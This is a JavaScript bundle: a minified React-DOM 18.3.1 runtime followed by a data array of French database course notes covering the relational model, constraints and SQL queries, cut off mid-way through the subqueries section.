11:n=qc(null,n,i,e,t);break e;case 14:n=Nc(null,n,i,Ge(i.type,e),t);break e}throw Error(P(306,i,""))}return n;case 0:return i=n.type,r=n.pendingProps,r=n.elementType===i?r:Ge(i,r),Po(e,n,i,r,t);case 1:return i=n.type,r=n.pendingProps,r=n.elementType===i?r:Ge(i,r),Ic(e,n,i,r,t);case 3:e:{if(nf(n),e===null)throw Error(P(387));i=n.pendingProps,s=n.memoizedState,r=s.element,Rm(e,n),ps(n,i,null,t);var a=n.memoizedState;if(i=a.element,s.isDehydrated)if(s={element:i,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},n.updateQueue.baseState=s,n.memoizedState=s,n.flags&256){r=Gt(Error(P(423)),n),n=Mc(e,n,i,t,r);break e}else if(i!==r){r=Gt(Error(P(424)),n),n=Mc(e,n,i,t,r);break e}else for(Re=On(n.stateNode.containerInfo.firstChild),De=n,G=!0,Qe=null,t=Tm(n,null,i,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(_t(),i===r){n=xn(e,n,t);break e}ge(e,n,i,t)}n=n.child}return n;case 5:return Dm(n),e===null&&So(n),i=n.type,r=n.pendingProps,s=e!==null?e.memoizedProps:null,a=r.children,ho(i,r)?a=null:s!==null&&ho(i,s)&&(n.flags|=32),ef(e,n),ge(e,n,a,t),n.child;case 6:return e===null&&So(n),null;case 13:return tf(e,n,t);case 4:return jl(n,n.stateNode.containerInfo),i=n.pendingProps,e===null?n.child=Ht(n,null,i,t):ge(e,n,i,t),n.child;case 11:return i=n.type,r=n.pendingProps,r=n.elementType===i?r:Ge(i,r),qc(e,n,i,r,t);case 7:return ge(e,n,n.pendingProps,t),n.child;case 8:return ge(e,n,n.pendingProps.children,t),n.child;case 12:return ge(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(i=n.type._context,r=n.pendingProps,s=n.memoizedProps,a=r.value,V(cs,i._currentValue),i._currentValue=a,s!==null)if(Ye(s.value,a)){if(s.children===r.children&&!Ae.current){n=xn(e,n,t);break e}}else for(s=n.child,s!==null&&(s.return=n);s!==null;){var o=s.dependencies;if(o!==null){a=s.child;for(var l=o.firstContext;l!==null;){if(l.context===i){if(s.tag===1){l=hn(-1,t&-t),l.tag=2;var u=s.updateQueue;if(u!==null){u=u.shared;var c=u.pending;c===null?l.next=l:(l.next=c.next,c.next=l),u.pending=l}}s.lanes|=t,l=s.alternate,l!==null&&(l.lanes|=t),bo(s.return,t,n),o.lanes|=t;break}l=l.next}}else if(s.tag===10)a=s.type===n.type?null:s.child;else if(s.tag===18){if(a=s.return,a===null)throw Error(P(341));a.lanes|=t,o=a.alternate,o!==null&&(o.lanes|=t),bo(a,t,n),a=s.sibling}else a=s.child;if(a!==null)a.return=s;else for(a=s;a!==null;){if(a===n){a=null;break}if(s=a.sibling,s!==null){s.return=a.return,a=s;break}a=a.return}s=a}ge(e,n,r.children,t),n=n.child}return n;case 9:return r=n.type,i=n.pendingProps.children,Ft(n,t),r=Ue(r),i=i(r),n.flags|=1,ge(e,n,i,t),n.child;case 14:return i=n.type,r=Ge(i,n.pendingProps),r=Ge(i.type,r),Nc(e,n,i,r,t);case 15:return Ym(e,n,n.type,n.pendingProps,t);case 17:return i=n.type,r=n.pendingProps,r=n.elementType===i?r:Ge(i,r),jr(e,n),n.tag=1,Ee(i)?(e=!0,os(n)):e=!1,Ft(n,t),$m(n,i,r),Ao(n,i,r,t),To(null,n,i,!0,e,t);case 19:return rf(e,n,t);case 22:return Zm(e,n,t)}throw Error(P(156,n.tag))};function Sf(e,n){return Xp(e,n)}function C2(e,n,t,i){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=i,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Be(e,n,t,i){return new C2(e,n,t,i)}function eu(e){return e=e.prototype,!(!e||!e.isReactComponent)}function A2(e){if(typeof e=="function")return eu(e)?1:0;if(e!=null){if(e=e.$$typeof,e===xl)return 11;if(e===Sl)return 14}return 2}function kn(e,n){var t=e.alternate;return t===null?(t=Be(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function _r(e,n,t,i,r,s){var a=2;if(i=e,typeof e=="function")eu(e)&&(a=1);else if(typeof e=="string")a=5;else e:switch(e){case xt:return rt(t.children,r,s,n);case yl:a=8,r|=8;break;case Xa:return e=Be(12,t,n,r|2),e.elementType=Xa,e.lanes=s,e;case Qa:return e=Be(13,t,n,r),e.elementType=Qa,e.lanes=s,e;case Wa:return e=Be(19,t,n,r),e.elementType=Wa,e.lanes=s,e;case Dp:return Hs(t,r,s,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Lp:a=10;break e;case Rp:a=9;break e;case xl:a=11;break e;case Sl:a=14;break e;case Pn:a=16,i=null;break e}throw Error(P(130,e==null?e:typeof e,""))}return n=Be(a,t,n,r),n.elementType=e,n.type=i,n.lanes=s,n}function rt(e,n,t,i){return e=Be(7,e,i,n),e.lanes=t,e}function Hs(e,n,t,i){return e=Be(22,e,i,n),e.elementType=Dp,e.lanes=t,e.stateNode={isHidden:!1},e}function Ta(e,n,t){return e=Be(6,e,null,n),e.lanes=t,e}function La(e,n,t){return n=Be(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function E2(e,n,t,i,r){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=oa(0),this.expirationTimes=oa(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=oa(0),this.identifierPrefix=i,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function nu(e,n,t,i,r,s,a,o,l){return e=new E2(e,n,t,o,l),n===1?(n=1,s===!0&&(n|=8)):n=0,s=Be(3,null,null,n),e.current=s,s.stateNode=e,s.memoizedState={element:i,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},kl(s),e}function P2(e,n,t){var i=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:yt,key:i==null?null:""+i,children:e,containerInfo:n,implementation:t}}function bf(e){if(!e)return Un;e=e._reactInternals;e:{if(ft(e)!==e||e.tag!==1)throw Error(P(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(Ee(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(P(171))}if(e.tag===1){var t=e.type;if(Ee(t))return Sm(e,t,n)}return n}function Cf(e,n,t,i,r,s,a,o,l){return e=nu(t,i,!0,e,r,s,a,o,l),e.context=bf(null),t=e.current,i=ye(),r=Fn(t),s=hn(i,r),s.callback=n??null,wn(t,s,r),e.current.lanes=r,Yi(e,r,i),Pe(e,i),e}function zs(e,n,t,i){var r=n.current,s=ye(),a=Fn(r);return t=bf(t),n.context===null?n.context=t:n.pendingContext=t,n=hn(s,a),n.payload={element:e},i=i===void 0?null:i,i!==null&&(n.callback=i),e=wn(r,n,a),e!==null&&(Ke(e,r,a,s),Br(e,r,a)),a}function Ss(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Hc(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function tu(e,n){Hc(e,n),(e=e.alternate)&&Hc(e,n)}function T2(){return null}var Af=typeof reportError=="function"?reportError:function(e){console.error(e)};function iu(e){this._internalRoot=e}Gs.prototype.render=iu.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(P(409));zs(e,n,null,null)};Gs.prototype.unmount=iu.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;pt(function(){zs(null,e,null,null)}),n[vn]=null}};function Gs(e){this._internalRoot=e}Gs.prototype.unstable_scheduleHydration=function(e){if(e){var n=Zp();e={blockedOn:null,target:e,priority:n};for(var t=0;t<Ln.length&&n!==0&&n<Ln[t].priority;t++);Ln.splice(t,0,e),t===0&&nm(e)}};function ru(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Xs(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function zc(){}function L2(e,n,t,i,r){if(r){if(typeof i=="function"){var s=i;i=function(){var u=Ss(a);s.call(u)}}var a=Cf(n,i,e,0,null,!1,!1,"",zc);return e._reactRootContainer=a,e[vn]=a.current,wi(e.nodeType===8?e.parentNode:e),pt(),a}for(;r=e.lastChild;)e.removeChild(r);if(typeof i=="function"){var o=i;i=function(){var u=Ss(l);o.call(u)}}var l=nu(e,0,!1,null,null,!1,!1,"",zc);return e._reactRootContainer=l,e[vn]=l.current,wi(e.nodeType===8?e.parentNode:e),pt(function(){zs(n,l,t,i)}),l}function Qs(e,n,t,i,r){var s=t._reactRootContainer;if(s){var a=s;if(typeof r=="function"){var o=r;r=function(){var l=Ss(a);o.call(l)}}zs(n,a,e,r)}else a=L2(t,n,e,r,i);return Ss(a)}Jp=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=pi(n.pendingLanes);t!==0&&(Al(n,t|1),Pe(n,K()),!(B&6)&&(Xt=K()+500,zn()))}break;case 13:pt(function(){var i=yn(e,1);if(i!==null){var r=ye();Ke(i,e,1,r)}}),tu(e,1)}};El=function(e){if(e.tag===13){var n=yn(e,134217728);if(n!==null){var t=ye();Ke(n,e,134217728,t)}tu(e,134217728)}};Yp=function(e){if(e.tag===13){var n=Fn(e),t=yn(e,n);if(t!==null){var i=ye();Ke(t,e,n,i)}tu(e,n)}};Zp=function(){return F};em=function(e,n){var t=F;try{return F=e,n()}finally{F=t}};ro=function(e,n,t){switch(n){case"input":if(Ja(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var i=t[n];if(i!==e&&i.form===e.form){var r=Fs(i);if(!r)throw Error(P(90));Np(i),Ja(i,r)}}}break;case"textarea":Mp(e,t);break;case"select":n=t.value,n!=null&&Mt(e,!!t.multiple,n,!1)}};Up=Jl;Vp=pt;var R2={usingClientEntryPoint:!1,Events:[er,At,Fs,kp,jp,Jl]},oi={findFiberByHostInstance:Yn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},D2={bundleType:oi.bundleType,version:oi.version,rendererPackageName:oi.rendererPackageName,rendererConfig:oi.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:bn.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=zp(e),e===null?null:e.stateNode},findFiberByHostInstance:oi.findFiberByHostInstance||T2,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Tr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Tr.isDisabled&&Tr.supportsFiber)try{Ms=Tr.inject(D2),an=Tr}catch{}}Ie.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=R2;Ie.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!ru(n))throw Error(P(200));return P2(e,n,null,t)};Ie.createRoot=function(e,n){if(!ru(e))throw Error(P(299));var t=!1,i="",r=Af;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(i=n.identifierPrefix),n.onRecoverableError!==void 0&&(r=n.onRecoverableError)),n=nu(e,1,!1,null,null,t,!1,i,r),e[vn]=n.current,wi(e.nodeType===8?e.parentNode:e),new iu(n)};Ie.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(P(188)):(e=Object.keys(e).join(","),Error(P(268,e)));return e=zp(n),e=e===null?null:e.stateNode,e};Ie.flushSync=function(e){return pt(e)};Ie.hydrate=function(e,n,t){if(!Xs(n))throw Error(P(200));return Qs(null,e,n,!0,t)};Ie.hydrateRoot=function(e,n,t){if(!ru(e))throw Error(P(405));var i=t!=null&&t.hydratedSources||null,r=!1,s="",a=Af;if(t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(s=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),n=Cf(n,null,e,1,t??null,r,!1,s,a),e[vn]=n.current,wi(e),i)for(e=0;e<i.length;e++)t=i[e],r=t._getVersion,r=r(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,r]:n.mutableSourceEagerHydrationData.push(t,r);return new Gs(n)};Ie.render=function(e,n,t){if(!Xs(n))throw Error(P(200));return Qs(null,e,n,!1,t)};Ie.unmountComponentAtNode=function(e){if(!Xs(e))throw Error(P(40));return e._reactRootContainer?(pt(function(){Qs(null,null,e,!1,function(){e._reactRootContainer=null,e[vn]=null})}),!0):!1};Ie.unstable_batchedUpdates=Jl;Ie.unstable_renderSubtreeIntoContainer=function(e,n,t,i){if(!Xs(t))throw Error(P(200));if(e==null||e._reactInternals===void 0)throw Error(P(38));return Qs(e,n,t,!1,i)};Ie.version="18.3.1-next-f1338f8080-20240426";function Ef(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Ef)}catch(e){console.error(e)}}Ef(),Ap.exports=Ie;var q2=Ap.exports,Pf,Gc=q2;Pf=Gc.createRoot,Gc.hydrateRoot;const Tf="bd",Lf="Bases de Données",Rf="#a78bfa",Df=[{id:"1.1",c:1,t:"Définitions fondamentales",x:`❖ Définition
  Une    base de données (BD) est un ensemble organisé de données structurées, stockées et ac-
  cessibles électroniquement.

  Un    SGBD (Système de Gestion de Bases de Données) est le logiciel qui permet de créer, gérer
  et interroger une base de données.

  Exemples de SGBD :        MySQL, PostgreSQL, Oracle, SQL Server, SQLite, MariaDB

  ➔ Résumé rapide Avantages d'un SGBD vs fichiers classiques

      Problème sans SGBD            Solution SGBD
      Redondance des données        Normalisation, clés étrangères
      Incohérence                   Contraintes d'intégrité
      Accès concurrent dicile      Transactions, verrouillage
      Sécurité insusante           Gestion des droits (GRANT/REVOKE)
      Pas d'interrogation flexible   SQL (langage de requêtes)`},{id:"1.2",c:1,t:"Niveaux d'abstraction (Architecture 3 niveaux)",x:`❖ Définition
  L'architecture    ANSI/SPARC définit 3 niveaux d'abstraction :
   Niveau externe (vues) : ce que voit chaque utilisateur/application
   Niveau conceptuel (logique) : structure globale de la BD (tables, relations)
   Niveau interne (physique) : stockage réel sur disque (fichiers, index)
  L'  indépendance des données : les changements au niveau physique n'affectent pas le niveau
  logique.`},{id:"1.3",c:1,t:"Modèles de bases de données",x:`1.3. MODÈLES DE BASES DE DONNÉES

➔ Résumé rapide Types de modèles

Modèle             Structure              Exemples
Hiérarchique       Arbre                  IMS (IBM)
Réseau             Graphe                 CODASYL
Relationnel        Tables (relations)     MySQL, PostgreSQL, Oracle
Objet              Objets                 ObjectDB
NoSQL Document     JSON/BSON              MongoDB
NoSQL Clé-Valeur   Paires clé/valeur      Redis
NoSQL Colonne      Familles de colonnes   Cassandra, HBase
NoSQL Graphe       N÷uds et arêtes        Neo4j

  2|             Modèle Entité-Association (E/A)`},{id:"2.1",c:2,t:"Concepts du modèle E/A",x:`❖ Définition
  Le modèle     Entité-Association (E/A ou E-R : Entity-Relationship) est utilisé pour la conception
  conceptuelle d'une base de données.
   Entité : objet du monde réel (ex: Etudiant, Cours)
   Attribut : propriété d'une entité (ex: nom, age)
   Clé (souligné) : attribut qui identifie uniquement une entité
   Association : lien entre entités (ex: «suit», «enseigne»)
   Cardinalité : nombre d'occurrences participant à l'association

  ➔ Résumé rapide Cardinalités et correspondances

      Cardinalité              Notation Exemple
      Un à un                  1:1         Personne — Passeport
      Un à plusieurs           1:N         Département — Employés
      Plusieurs à plusieurs    N:M         Etudiants — Cours

  ➤ Exemple Schéma E/A — Système Universitaire

                                                           note
                       CNE           nom                              titre      code

                              ETUDIANT                   s'inscrit   COURS

                                     N                                M`},{id:"2.2",c:2,t:"Du schéma E/A au schéma relationnel",x:`➣ Formule / Syntaxe Règles de transformation E/A → Relationnel

  1. Entité → Table (clé primaire = identifiant E/A)
  2. Association 1:N → Clé étrangère du côté «plusieurs»
  3. Association N:M → Nouvelle table avec les clés des deux entités
  4. Association 1:1 → Clé étrangère (ou fusion des tables)
  5. Attribut multivalué → Nouvelle table
  6. Héritage → 3 stratégies : table unique / table par sous-type / table par classe concrète

                                    2.2. DU SCHÉMA E/A AU SCHÉMA RELATIONNEL

➤ Exemple Transformation
E/A : ETUDIANT(N) —s'inscrit(note)—(M) COURS

⇒ Tables :
   ETUDIANT(cne, nom, prenom, age)
   COURS(code, titre, credits)
   INSCRIPTION(cne, code, note) — table d'association N:M

  3|             Modèle Relationnel`},{id:"3.1",c:3,t:"Terminologie",x:`❖ Définition

      Terme formel           Terme courant
      Relation               Table
      Tuple                  Ligne / enregistrement / row
      Attribut               Colonne / champ
      Domaine                Type de données
      Schéma de relation     Définition de la table
      Instance (extension)   Contenu actuel de la table
      Degré (arité)          Nombre de colonnes
      Cardinalité            Nombre de lignes`},{id:"3.2",c:3,t:"Contraintes d'intégrité",x:`❖ Définition
  Types de contraintes :
   Clé primaire (PK) : identifie uniquement chaque tuple, NOT NULL + UNIQUE
   Clé étrangère (FK) : référence une clé primaire d'une autre table (intégrité référentielle)
   UNIQUE : valeurs uniques dans la colonne (peut être NULL)
   NOT NULL : valeur obligatoire
   CHECK : condition sur les valeurs (age > 0)
   DEFAULT : valeur par défaut si non spécifiée

  ☞ Attention / Piège
         Une clé primaire ne peut jamais être NULL
         Une clé étrangère peut être NULL (si la relation est optionnelle)
         UNIQUE admet un seul NULL (selon le SGBD)
         Une table peut avoir plusieurs clés candidates mais une seule clé primaire`},{id:"3.3",c:3,t:"Algèbre relationnelle",x:`❖ Définition
  L'algèbre relationnelle est le fondement théorique de SQL. Opérations de base :
   σ (Sélection) : filtre les tuples selon une condition
   π (Projection) : sélectionne des colonnes
   ▷◁ (Jointure) : combine deux relations
   ∪ (Union), ∩ (Intersection), − (Différence)
   × (Produit cartésien)

                                                        3.3. ALGÈBRE RELATIONNELLE

 ρ (Renommage)
 ÷ (Division) : opérateur «pour tout»

➤ Exemple Algèbre relationnelle
Relations : ETUDIANT(cne,   nom, age) et INSCRIPTION(cne, code, note)

    σage>20 (ETUDIANT) ≡ SELECT * FROM ETUDIANT WHERE age > 20
    πnom,age (ETUDIANT) ≡ SELECT nom, age FROM ETUDIANT
    ETUDIANT         ▷◁  INSCRIPTION   ≡ SELECT * FROM ETUDIANT JOIN INSCRIPTION
     USING(cne)
    πnom (σnote≥10 (ETUDIANT ▷◁ INSCRIPTION))

            Part II

SQL — Structured Query Language

     4|         SQL — LDD et LMD`},{id:"4.1",c:4,t:"Types de commandes SQL",x:`➔ Résumé rapide Catégories SQL

      Catégorie Nom                             Commandes
      DDL        Data Definition Language        CREATE, ALTER, DROP, TRUNCATE
      DML        Data Manipulation Language     INSERT, UPDATE, DELETE
      DQL        Data Query Language            SELECT
      DCL        Data Control Language          GRANT, REVOKE
      TCL        Transaction Control Language   COMMIT, ROLLBACK, SAVEPOINT`},{id:"4.2",c:4,t:"DDL — Définition des données",x:`➣ Formule / Syntaxe CREATE TABLE

 1   CREATE TABLE Etudiant (
 2       cne        VARCHAR (10)       PRIMARY KEY ,
 3       nom        VARCHAR (50)       NOT NULL ,
 4       prenom     VARCHAR (50)       NOT NULL ,
 5       age        INTEGER            CHECK ( age >= 18 AND age <= 60) ,
 6       email      VARCHAR (100)      UNIQUE ,
 7       date_nais DATE ,
 8       fk_dept    INTEGER            REFERENCES Departement ( id )
 9                                     ON DELETE SET NULL
10                                     ON UPDATE CASCADE
11   );
13   -- Contrainte nommee ( meilleure pratique )
14   CREATE TABLE Cours (
15       code    CHAR (6)     NOT NULL ,
16       titre   VARCHAR (100) NOT NULL ,
17       credits SMALLINT     DEFAULT 3 ,
18       CONSTRAINT pk_cours PRIMARY KEY ( code ) ,
19       CONSTRAINT chk_credits CHECK ( credits BETWEEN 1 AND 6)
20   );

     ➣ Formule / Syntaxe ALTER TABLE — Modification de structure

 1   -- Ajouter une colonne
 2   ALTER TABLE Etudiant ADD COLUMN niveau VARCHAR (20) ;
 4   -- Modifier un type
 5   ALTER TABLE Etudiant MODIFY COLUMN age SMALLINT ; -- MySQL
 6   ALTER TABLE Etudiant ALTER COLUMN age TYPE SMALLINT ; -- PostgreSQL

                                                    4.3. DML — MANIPULATION DES DONNÉES

 8   -- Supprimer une colonne
 9   ALTER TABLE Etudiant DROP COLUMN niveau ;
11   -- Ajouter une contrainte
12   ALTER TABLE Etudiant ADD CONSTRAINT chk_email
13       CHECK ( email LIKE '% @ % ') ;
15   -- Ajouter une cle etrangere
16   ALTER TABLE Inscription
17       ADD CONSTRAINT fk_etud FOREIGN KEY ( cne )
18       REFERENCES Etudiant ( cne ) ;

     ➣ Formule / Syntaxe DROP et TRUNCATE

 1   DROP TABLE Etudiant ;                   -- Supprime la table ( structure + donnees
        )
 2   DROP TABLE IF EXISTS Etudiant ;         -- Sans erreur si n ' existe pas
 3   TRUNCATE TABLE Etudiant ;               -- Vide la table ( garde la structure )
 4   DROP DATABASE ma_base ;                 -- Supprime toute la base

     ☞ Attention / Piège

         DROP supprime tout (structure + données), non annulable
         TRUNCATE vide les données mais garde la structure, réinitialise l'auto-incrément
         DELETE (sans WHERE) supprime ligne par ligne, peut être annulé (ROLLBACK)
         On ne peut pas supprimer une table référencée par une clé étrangère sans ON DELETE
          CASCADE ou suppression dans l'ordre inverse`},{id:"4.3",c:4,t:"DML — Manipulation des données",x:`➣ Formule / Syntaxe INSERT

 1   -- Insertion d ' une ligne
 2   INSERT INTO Etudiant ( cne , nom , prenom , age , email )
 3   VALUES ( ' E001 ' , ' Alaoui ' , ' Ahmed ' , 22 , ' ahmed@univ . ma ') ;
 5   -- Insertion multiple
 6   INSERT INTO Cours ( code , titre , credits ) VALUES
 7       ( ' INFO01 ' , ' Algorithmique ' , 4) ,
 8       ( ' INFO02 ' , ' Base de Donnees ' , 3) ,
 9       ( ' MATH01 ' , ' Analyse ' , 4) ;
11   -- Insertion depuis une requete
12   INSERT INTO Etudiant_Archive
13   SELECT * FROM Etudiant WHERE age > 30;

     ➣ Formule / Syntaxe UPDATE et DELETE

 1   -- Modification
 2   UPDATE Etudiant
 3   SET age = 23 , email = ' new@univ . ma '

                                           4.3. DML — MANIPULATION DES DONNÉES

 4   WHERE cne = ' E001 ';
 6   -- Modification avec sous - requete
 7   UPDATE Inscription
 8   SET note = note * 1.1
 9   WHERE cne IN ( SELECT cne FROM Etudiant WHERE age < 20) ;
11   -- Suppression
12   DELETE FROM Inscription WHERE note < 5;
14   -- ATTENTION : sans WHERE , efface TOUT !
15   DELETE FROM Inscription ; -- Vide completement la table

     5|            SQL — DQL : Requêtes SELECT`},{id:"5.1",c:5,t:"Structure complète d'un SELECT",x:`➣ Formule / Syntaxe Ordre d'exécution SQL

 1   SELECT [ DISTINCT ] colonnes / expressions            -- 5 e : quoi afficher
 2   FROM tables                                           -- 1 er : quelles tables
 3   [ JOIN ... ON ...]                                    -- 2 e : jointures
 4   [ WHERE condition ]                                   -- 3 e : filtrer les lignes
 5   [ GROUP BY colonnes ]                                 -- 4 e : regrouper
 6   [ HAVING condition_groupe ]                           -- 5 e : filtrer les groupes
 7   [ ORDER BY colonnes [ ASC | DESC ]]                   -- 6 e : trier
 8   [ LIMIT n [ OFFSET m ]];                              -- 7 e : limiter

     ★ Astuce Concours
     Ordre d'exécution vs ordre d'écriture :
     Ordre d'écriture : SELECT — FROM — WHERE — GROUP BY — HAVING — ORDER BY —
     LIMIT
     Ordre d'   exécution : FROM — JOIN — WHERE — GROUP BY — HAVING — SELECT — ORDER
     BY — LIMIT
     Cela explique pourquoi on   ne peut pas utiliser un alias de SELECT dans un WHERE !`},{id:"5.2",c:5,t:"Filtrage et opérateurs",x:`➣ Formule / Syntaxe Opérateurs WHERE

 1   -- Comparaisons
 2   WHERE age >= 18 AND age <= 25                  -- ou : age BETWEEN 18 AND 25
 3   WHERE nom = ' Alaoui '
 4   WHERE nom <> ' Alaoui '                        -- != equivalent
 6   -- Appartenance
 7   WHERE code IN ( ' INFO01 ' , ' INFO02 ' , ' MATH01 ')
 8   WHERE code NOT IN ( ' MATH01 ')
10   -- Chaines de caracteres ( LIKE )
11   WHERE nom LIKE ' Al % '    -- commence par " Al "
12   WHERE nom LIKE ' _l % '    -- 2 eme lettre est " l "
13   WHERE nom LIKE '% aoui '   -- finit par " aoui "
14   WHERE nom LIKE '% ao % '   -- contient " ao "
15   -- % : n ' importe quelle suite , _ : un caractere
17   -- Valeurs nulles
18   WHERE email IS NULL
19   WHERE email IS NOT NULL           -- JAMAIS : WHERE email = NULL

                                                                5.3. FONCTIONS D'AGRÉGATION`},{id:"5.3",c:5,t:"Fonctions d'agrégation",x:`➣ Formule / Syntaxe Agregation et GROUP BY

 1   -- Fonctions agregat
 2   SELECT
 3       COUNT (*)                 AS   total_lignes ,
 4       COUNT ( email )           AS   nb_avec_email ,       -- ignore les NULL
 5       SUM ( credits )           AS   total_credits ,
 6       AVG ( note )              AS   moyenne ,
 7       MIN ( note )              AS   min_note ,
 8       MAX ( note )              AS   max_note
 9   FROM Inscription ;
11   -- GROUP BY : une valeur par groupe
12   SELECT code , COUNT (*) AS nb_inscrits , AVG ( note ) AS moyenne
13   FROM Inscription
14   GROUP BY code
15   HAVING AVG ( note ) >= 10      -- filtrer les groupes ( pas WHERE )
16   ORDER BY moyenne DESC ;
18   -- Exemple complet
19   SELECT e . nom , COUNT ( i . code ) AS nb_cours , AVG ( i . note ) AS moy
20   FROM Etudiant e
21   JOIN Inscription i ON e . cne = i . cne
22   GROUP BY e . cne , e . nom
23   HAVING COUNT ( i . code ) >= 2
24   ORDER BY moy DESC
25   LIMIT 10;

     ☞ Attention / Piège

         COUNT(*) compte toutes les lignes (y compris NULL)
         COUNT(colonne) ignore les NULL dans cette colonne
         Tout attribut dans SELECT doit être dans GROUP BY ou dans une fonction agrégat
         WHERE filtre avant le groupement ; HAVING filtre après
         HAVING peut utiliser les fonctions d'agrégat, pas WHERE`},{id:"5.4",c:5,t:"Jointures (JOIN)",x:`❖ Définition
     Une   jointure combine les lignes de deux tables selon une condition. C'est l'opération la plus
     importante en SQL.

     ➣ Formule / Syntaxe Types de jointures

 1   -- Tables exemples
 2   -- ETUDIANT : cne | nom
 3   -- INSCRIPTION : cne | code | note
 5   -- INNER JOIN : seulement les lignes communes
 6   SELECT e . nom , i . code , i . note
 7   FROM Etudiant e

                                                       5.5. SOUS-REQUÊTES (SUBQUERIES)

 8   INNER JOIN Inscription i ON e . cne = i . cne ;
10   -- LEFT JOIN : tous les etudiants , meme sans inscription
11   SELECT e . nom , i . code , i . note
12   FROM Etudiant e
13   LEFT JOIN Inscription i ON e . cne = i . cne ;
14   -- i . code et i . note seront NULL si pas d ' inscription
16   -- RIGHT JOIN : tous les cours , meme sans inscrit
17   SELECT e . nom , i . code
18   FROM Etudiant e
19   RIGHT JOIN Inscription i ON e . cne = i . cne ;
21   -- FULL OUTER JOIN : tout des deux cotes
22   SELECT e . nom , i . code
23   FROM Etudiant e
24   FULL OUTER JOIN Inscription i ON e . cne = i . cne ;
26   -- CROSS JOIN : produit cartesien ( toutes les combinaisons )
27   SELECT e . nom , c . titre
28   FROM Etudiant e CROSS JOIN Cours c ;
30   -- AUTO - JOINTURE : jointure d ' une table avec elle - meme
31   SELECT e1 . nom AS employe , e2 . nom AS manager
32   FROM Employe e1
33   JOIN Employe e2 ON e1 . manager_id = e2 . id ;

     ➤ Exemple Visualisation des jointures

           A                B

                                         LEFT JOIN              FULL OUTER JOIN

               INNER JOIN                RIGHT JOIN`},{id:"5.5",c:5,t:"Sous-requêtes (Subqueries)",x:`➣ Formule / Syntaxe Types de sous-requêtes

 1   -- 1. Sous - requete scalaire ( retourne 1 valeur )
 2   SELECT nom FROM Etudiant
 3   WHERE age = ( SELECT MAX ( age ) FROM Etudiant ) ;
 5   -- 2. Sous - requete dans IN
 6   SELECT nom FROM Etudiant
